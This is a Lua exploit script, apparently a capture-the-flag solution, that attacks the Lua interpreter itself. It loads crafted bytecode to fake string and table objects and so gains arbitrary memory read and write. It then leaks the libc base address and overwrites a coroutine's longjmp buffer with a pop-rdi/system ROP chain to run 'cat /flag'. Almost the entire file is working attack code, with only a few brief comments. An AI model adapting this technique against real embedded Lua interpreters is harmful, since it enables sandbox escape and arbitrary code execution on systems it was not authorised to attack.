function unhexlify(str)
    return str:gsub('..', function(b)
        return string.char(tonumber(b, 16))
    end)
end

function hex(v)
    return string.format("0x%x", v)
end

function addrof(v)
    local strrep = tostring(v)
    local i = string.find(strrep, '0x')
    if i == nil then
        error("Cannot obtain address of given value")
    end
    return tonumber(string.sub(strrep, i+2), 16)
end

function hexdump(buf)
    local str = ''
    for i=1,math.ceil(#buf/16) * 16 do
        if (i-1) % 16 == 0 then
            str = str .. string.format('%08X  ', i-1)
        end
        str = str .. (i > #buf and '   ' or string.format('%02X ', buf:byte(i)))
        if i %  8 == 0 then
            str = str .. ' '
        end
        if i % 16 == 0 then
            str = str .. '\n'
        end
    end
    return str
end

chunkbytes = unhexlify("CHUNK")

function hax()
    local binary_addr  = addrof(math.abs) - 0x35088
    print("[*] Binary @ " .. hex(binary_addr))

    -- This table's 'array' member will be corrupted later on
    local memview = {1,2,3,4,5}

    local fake_string_data = string.pack('<LbbbbIT', 0,   0x14, 0,     0,    2,     0,    0x7fffffffffffffff)
                                                     -- next tt    marked flags lsizenode sizearray array                  node lastfree metatable gclist
    local fake_table_data = string.pack('<LbbbbILLLLL', 0,   0x45, 0,     0,    0,        0x10,    addrof(memview) + 0x10, 0,   0,       0,        0)

    -- Command to execute via system() later on
    local command = "cat /flag\x00"

    local fill = {}
    for i=1,100 do
        fill[i] = {i=i}
    end
    -- Must be rooted to avoid garbage collection
    data = "ABABABABABABABAB" .. fake_string_data .. "CDCDCDCDCDCDCDCD" .. fake_table_data .. "EFEFEFEFEFEFEFEF" .. command

    local table_addr = addrof(fill[#fill])
    print("[*] Known table @ " .. hex(table_addr))
    local data_addr = table_addr + 184
    local fake_string_addr = data_addr + 0x10
    local fake_table_addr = fake_string_addr + 0x10 + #fake_string_data
    command_addr = fake_table_addr + 0x10 + #fake_table_data            -- TODO must be global currently global
    print("[*] Data @ " .. hex(data_addr))
    print("[*] Fake string @ " .. hex(fake_string_addr))
    print("[*] Fake table @ " .. hex(fake_table_addr))


    -- Hack. Needed since '%' in a replacement string has special meaning
    chunkbytes = chunkbytes:gsub('AAAAAAAA', function() return string.pack('<L', fake_string_addr) end)
    chunkbytes = chunkbytes:gsub('BBBBBBBB', function() return string.pack('<L', fake_table_addr) end)
    local chunk = load(chunkbytes)
    local num, fake_string, fake_table = chunk()

    print("[+] Fake objects created")
    print("        Fake number: " .. hex(num) .. " (" .. type(num) .. ")")
    print("        Fake string: " .. fake_string:sub(1,4) .. "... (length: " .. hex(#fake_string) .. ")")
    print("        Fake table: "  .. hex(addrof(fake_table)))

    local memory = {}

    function memory.can_read(addr)
        return addr - (fake_table_addr + 22 + 1) >= 0
    end

    function memory.read(addr, size)
        local relative_addr = addr - (fake_string_addr + 22 + 1)
        if relative_addr < 0 then
            print("[-] Cannot read from " .. hex(addr))
            error()
        end
        return fake_string:sub(relative_addr, relative_addr + size - 1)
    end

    function memory.write(addr, val)
        fake_table[1] = addr
        memview[1] = val
    end

    return memory
end

function find_libc_base(some_libc_address)
    local candidate = some_libc_address & 0xfffffffffffff000
    while memory.read(candidate, 4) ~= '\x7fELF' do
        candidate = candidate - 0x1000
    end
    return candidate
end

function pwn()
    memory = hax()

    coro_fn = function()
        local coro_addr = addrof(coro)
        print("[*] Now executing coroutine. Associated state structure @ " .. hex(coro_addr))

        local state_struct = memory.read(coro_addr, 208)
        print(hexdump(state_struct))
        local longjmp_buffer_addr = string.unpack('<L', string.sub(state_struct, 89, 97))
        print("[+] longjmp buffer @ " .. hex(longjmp_buffer_addr))

        print(hexdump(memory.read(longjmp_buffer_addr, 0x200)))

        local some_libc_address = string.unpack('<L', memory.read(longjmp_buffer_addr + 0xa8, 8))
        local libc_base = find_libc_base(some_libc_address)
        print("[+] libc @ " .. hex(libc_base))

        pop_rdi = libc_base + 0x129eb           -- pop rdi ; ret
        print("[+] pop_rdi @ " .. hex(pop_rdi))
        system_addr = libc_base + 0x46180
        print("[+] system @ " .. hex(system_addr))
        print("[+] command @ " .. hex(command_addr))

        new_stack = longjmp_buffer_addr + 0x100
        memory.write(new_stack,     command_addr)
        memory.write(new_stack + 8, system_addr)

        memory.write(longjmp_buffer_addr + 56, new_stack)           -- rsp
        memory.write(longjmp_buffer_addr + 64, pop_rdi)             -- rip

        print("[*] ready to go!")
        coroutine.yield()
    end

    coro = coroutine.create(coro_fn)
    while not memory.can_read(addrof(coro)) do
        coro = coroutine.create(coro_fn)
    end

    print("[*] Coroutine created: " .. tostring(coro))
    coroutine.resume(coro)
end

pwn()
